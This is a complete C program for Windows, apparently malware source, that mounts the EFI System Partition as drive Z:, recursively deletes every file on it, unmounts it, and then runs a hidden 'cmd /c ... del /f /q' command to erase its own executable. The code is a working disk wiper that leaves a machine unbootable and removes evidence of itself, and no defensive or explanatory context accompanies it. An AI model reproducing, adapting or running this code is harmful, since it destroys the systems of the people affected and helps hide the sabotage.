#include <stdio.h>
#include <windows.h>

void walk(const char *dir) {    // recebe o path do dir
    WIN32_FIND_DATA fd;         // receive the dir datas
    char path[MAX_PATH];        // max path value 260 chars
    HANDLE h;                   // handle to search for findnext

    sprintf(path, "%s\\*", dir);    // create the complete path

    if ((h = FindFirstFile(path, &fd)) == INVALID_HANDLE_VALUE) // verify if its a valid path
        return;

    do {
        if (!lstrcmp(fd.cFileName, ".") || !lstrcmp(fd.cFileName, ".."))    // if . or .. jump, avoid infinit loop
            continue;

        sprintf(path, "%s\\%s", dir, fd.cFileName); // create the path + file name

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {   // verify if its a dir or a file
            walk(path); // if its a dir, walk
        } else {
            DeleteFileA(path);  // if its a file, delete
        }

    } while (FindNextFile(h, &fd)); // while exist files into the dirs

    FindClose(h);   // close
}

int main() {

    system("mountvol Z: /S");
    walk("Z:");
    system("mountvol Z: /D");

    
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char cmd[MAX_PATH + 50];
    sprintf(cmd, "cmd /c timeout /t 2 >nul & del /f /q \"%s\"", path);
    WinExec(cmd, SW_HIDE);

    return 0;
}